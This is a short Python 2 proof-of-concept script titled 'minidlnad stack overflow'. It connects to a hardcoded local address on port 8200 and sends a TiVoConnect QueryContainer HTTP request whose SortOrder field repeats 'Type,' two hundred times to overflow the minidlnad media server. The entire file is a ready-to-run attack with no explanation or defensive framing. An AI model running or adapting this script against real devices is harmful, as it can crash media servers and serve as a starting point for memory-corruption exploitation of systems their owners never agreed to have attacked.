#!/usr/bin/env python
"""
minidlnad stack overflow
"""
from socket import *
import sys
import urllib
import telnetlib



host='192.168.1.46'
port=8200


sock=socket(AF_INET,SOCK_STREAM)
sock.connect((host,port))
sock.settimeout(100)

v='Type,' * 200
s='GET /TiVoConnect?Command=QueryContainer&Container=foobar&SortOrder=%s HTTP/1.1 \r\n' % v
s+='Host: %s\r\n' % host
s+='User-Agent: Arduino \r\n'
s+='Accept: */*\r\n'
s+='\r\n'


sock.sendall(s)
print 'sent'
print sock.recv(10000)
sock.close()
